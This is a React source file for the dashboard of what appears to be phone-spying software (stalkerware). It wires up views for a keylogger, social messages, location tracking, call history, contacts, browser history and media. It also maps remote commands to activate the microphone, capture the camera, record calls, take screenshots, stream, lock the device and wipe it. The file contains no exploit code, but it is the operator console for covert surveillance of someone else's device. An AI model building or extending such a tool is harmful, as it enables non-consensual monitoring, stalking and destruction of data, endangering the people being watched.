import React, { useState, useEffect } from 'react';
import { Routes, Route, useLocation, useNavigate } from 'react-router-dom';
import Header from './components/Header';
import Sidebar from './components/Sidebar';
import TacticalMap from './components/TacticalMap';
import ActivityFeed from './components/ActivityFeed';
import IntelPanel from './components/IntelPanel';
import KeywordMonitor from './components/KeywordMonitor';
import SpyPanel from './components/SpyPanel';
import Login from './components/Login';
import RemoteControl from './components/RemoteControl';
import Blocker from './components/Blockers';
import AITools from './components/AITools';
import Keylogger from './components/Keylogger';
import SocialMessages from './components/SocialMessages';
import Locations from './components/Locations';
import MediaGallery from './components/MediaGallery';
import CallHistory from './components/CallHistory';
import Contacts from './components/Contacts';
import BrowserHistory from './components/BrowserHistory';
import InstalledApps from './components/InstalledApps';
import Timeline from './components/Timeline';
import Alerts from './components/Alerts';
import { PairingModal } from './components/Pairing/PairingModal';
import { supabase } from './lib/supabase';
import { Mic, Camera, Phone, Scan, Cast, LayoutGrid, Globe, WifiOff, Bot, Sparkles } from 'lucide-react';

function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [showPairingModal, setShowPairingModal] = useState(false);
  const [devices, setDevices] = useState<any[]>([]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [activeView, setActiveView] = useState('dashboard');

  useEffect(() => {
    // Check initial auth state
    supabase.auth.getSession().then(({ data: { session } }) => {
      if (session) setIsAuthenticated(true);
    });

    const {
      data: { subscription },
    } = supabase.auth.onAuthStateChange((_event, session) => {
      setIsAuthenticated(!!session);
    });

    return () => subscription.unsubscribe();
  }, []);

  useEffect(() => {
    if (!isAuthenticated) return;

    // Initial fetch
    const fetchDevices = async () => {
      try {
        const resp = await fetch('/api/devices');
        const json = await resp.json();
        const data = Array.isArray(json?.devices) ? json.devices : [];

        if (data.length > 0) {
          setDevices(data);
          if (!selectedId || !data.find((d: any) => d.id === selectedId)) {
            setSelectedId(data[0].id);
          }
        } else {
          setDevices([]);
          setSelectedId(null);
        }
      } catch {
        setDevices([]);
        setSelectedId(null);
      }
    };

    fetchDevices();

    const interval = setInterval(fetchDevices, 1500);

    return () => {
      clearInterval(interval);
    };
  }, [isAuthenticated]);

  const selectedDevice = devices.find(d => d.id === selectedId);

  // Remote Control Wrapper Component
  function RemoteControlWrapper() {
    const location = useLocation();
    const navigate = useNavigate();
    const { command, deviceId } = location.state || {};

    const commandViewMap: Record<string, string> = {
      'activate_mic': 'mic',
      'camera_capture': 'camera',
      'record_call': 'calls',
      'take_screenshot': 'screenshots',
      'start_stream': 'stream',
      'lock_device': 'lock',
      'wipe_device': 'wipe'
    };

    const viewType = commandViewMap[command] || 'mic';

    return <RemoteControl type={viewType as any} />;
  }

  // Placeholder content for new views
  const renderContent = () => {
    if (activeView === 'dashboard') {
      return (
        <div className="flex-1 flex overflow-hidden">
          {/* Coluna Central: Mapa + Activity Feed (Flex grow) */}
          <div className="flex-1 flex flex-col relative z-10 min-w-[400px]">
            {/* Mapa Tático (60%) */}
            <div className="h-[60%] border-b border-border-color relative">
              <TacticalMap 
                devices={devices} 
                onDeviceSelect={setSelectedId} 
              />
            </div>
            
            {/* Activity Feed (40%) */}
            <div className="h-[40%] bg-bg-secondary">
              <ActivityFeed />
            </div>
          </div>
          
          {/* Coluna Direita: Intelligence Panel (380px fixed) */}
          <div className="w-96 min-w-[380px] bg-bg-secondary border-l border-border-color flex flex-col z-20 shadow-xl">
            <IntelPanel selectedDevice={selectedDevice} />
          </div>
        </div>
      );
    }

    if (activeView === 'keywords') {
      return <KeywordMonitor />;
    }

    if (activeView === 'spy_panel') {
      return <SpyPanel />;
    }

    // Remote Control Modules
    if (['mic', 'camera', 'calls', 'screenshots', 'stream'].includes(activeView)) {
      return <RemoteControl type={activeView as any} />;
    }

    // Blocker Modules
    if (['block_apps', 'block_websites', 'block_wifi'].includes(activeView)) {
        const typeMap: Record<string, 'apps' | 'websites' | 'wifi'> = {
            'block_apps': 'apps',
            'block_websites': 'websites',
            'block_wifi': 'wifi'
        };
        return <Blocker type={typeMap[activeView]} />;
    }

    // AI Tools
    if (['chatgpt', 'gemini'].includes(activeView)) {
        return <AITools type={activeView as any} />;
    }

    // General Data Modules
    if (activeView === 'keylogger') return <Keylogger />;
    if (activeView === 'social_messages') return <SocialMessages />;
    if (activeView === 'locations') return <Locations />;
    if (activeView === 'media_gallery') return <MediaGallery />;
    if (activeView === 'call_history') return <CallHistory />;
    if (activeView === 'contacts') return <Contacts />;
    if (activeView === 'browser_history') return <BrowserHistory />;
    if (activeView === 'installed_apps') return <InstalledApps />;
    if (activeView === 'timeline') return <Timeline />;
    if (activeView === 'alerts') return <Alerts />;

    // Generic Placeholder for unknown views
    return (
      <div className="flex-1 flex items-center justify-center bg-bg-primary text-text-secondary flex-col gap-4">
        <div className="w-24 h-24 rounded-full bg-bg-tertiary flex items-center justify-center animate-pulse">
          {getViewIcon(activeView)}
        </div>
        <h2 className="text-2xl font-tactical font-bold uppercase tracking-widest text-accent-blue">
           {activeView.replace('_', ' ')}
        </h2>
        <p className="font-mono text-sm opacity-50">Module initialized. Waiting for agent stream...</p>
      </div>
    );
  };

  if (!isAuthenticated) {
    return <Login onLoginSuccess={() => setIsAuthenticated(true)} />;
  }

  return (
    <div className="h-screen w-screen bg-bg-primary text-text-primary font-tactical overflow-hidden flex flex-col">
      {/* Header Global */}
      <Header />
      
      <div className="flex-1 flex overflow-hidden">
        {/* Sidebar (Left Column) */}
        <Sidebar 
          devices={devices} 
          selectedId={selectedId} 
          onSelect={setSelectedId}
          activeView={activeView}
          onViewChange={setActiveView}
          onAddDevice={() => setShowPairingModal(true)}
        />
        
        {/* Main Content Area */}
        <Routes>
          <Route path="/" element={renderContent()} />
          <Route path="/remote-control" element={<RemoteControlWrapper />} />
        </Routes>

        {/* Modals */}
        {showPairingModal && (
          <PairingModal onClose={() => setShowPairingModal(false)} />
        )}
      </div>
    </div>
  );
}

const getViewIcon = (view: string) => {
  switch (view) {
    case 'mic': return <Mic size={48} />;
    case 'camera': return <Camera size={48} />;
    case 'calls': return <Phone size={48} />;
    case 'screenshots': return <Scan size={48} />;
    case 'stream': return <Cast size={48} />;
    case 'block_apps': return <LayoutGrid size={48} />;
    case 'block_websites': return <Globe size={48} />;
    case 'block_wifi': return <WifiOff size={48} />;
    case 'chatgpt': return <Bot size={48} />;
    case 'gemini': return <Sparkles size={48} />;
    default: return <Bot size={48} />;
  }
};

export default App;
